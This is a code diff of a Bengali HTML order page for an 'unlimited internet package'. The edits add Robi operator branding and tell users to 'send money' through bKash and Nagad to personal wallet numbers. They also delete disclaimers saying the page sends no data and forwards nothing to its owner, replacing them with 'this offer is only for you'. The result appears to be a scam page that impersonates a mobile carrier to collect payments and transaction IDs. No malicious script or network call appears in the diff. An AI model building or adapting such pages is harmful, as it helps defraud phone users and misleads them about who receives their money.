@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>আনলিমিটেড ইন্টারনেট প্যাকেজ</title>
+  <title> Robi আনলিমিটেড ইন্টারনেট প্যাকেজ</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -139,8 +139,8 @@
       </div>
 
       <div class="form-group">
-        <label for="phoneNumber">📱 আপনার ফোন নম্বর</label>
-        <input type="tel" id="phoneNumber" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric">
+        <label for="phoneNumber">📱 আপনার রবি নম্বর</label>
+        <input type="tel" id="phoneNumber" placeholder="01839571405" maxlength="11" inputmode="numeric">
         <span class="error-message" id="phoneError"></span>
       </div>
 
@@ -149,7 +149,7 @@
         <div class="payment-option selected" id="bkashOption" onclick="selectPaymentMethod('bkash')">
           <label><input type="radio" name="paymentMethod" value="bkash" checked> bKash</label>
           <div class="payment-title">বিকাশ</div>
-          <p class="muted">পেমেন্ট নম্বর ব্যবহার করে টাকা পাঠান</p>
+          <p class="muted"> সেন্ডমানি করুন </p>
           <div class="number-display">
             <span class="pay-number">01580987778</span>
             <button class="copy-btn" type="button" onclick="copyNumber('01580987778', event)">কপি করুন</button>
@@ -158,7 +158,7 @@
         <div class="payment-option" id="nagadOption" onclick="selectPaymentMethod('nagad')">
           <label><input type="radio" name="paymentMethod" value="nagad"> Nagad</label>
           <div class="payment-title">নগদ</div>
-          <p class="muted">পেমেন্ট নম্বর ব্যবহার করে টাকা পাঠান</p>
+          <p class="muted"> সেন্ডমানি করুন</p>
           <div class="number-display">
             <span class="pay-number">01614175872</span>
             <button class="copy-btn" type="button" onclick="copyNumber('01614175872', event)">কপি করুন</button>
@@ -174,7 +174,7 @@
 
       <button class="submit-btn" type="button" onclick="submitOrder()">অর্ডার জমা দিন</button>
       <div class="success-message" id="successMessage"></div>
-      <p class="muted" style="margin-top:12px">নোট: এই পেজটি অর্ডারের তথ্য সার্ভারে পাঠায় না। জমা দেওয়া তথ্য শুধু এই পেজে দেখানো হয়।</p>
+      <p class="muted" style="margin-top:12px">নোট: এই প্যাকেজটি শুধু আপনার জন্যই </p>
     </section>
   </main>
 
@@ -258,7 +258,7 @@
         "ফোন নম্বর: " + phone + "<br>" +
         "পেমেন্ট: " + methodName + "<br>" +
         "Transaction ID: " + transactionId +
-        "<br><br>মনে রাখবেন: এই তথ্য স্বয়ংক্রিয়ভাবে মালিকের কাছে পাঠানো হয়নি।";
+        "<br><br>মনে রাখবেন: অফারটি শুধু আপনার জন্যই.";
       success.classList.add("show");
       success.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
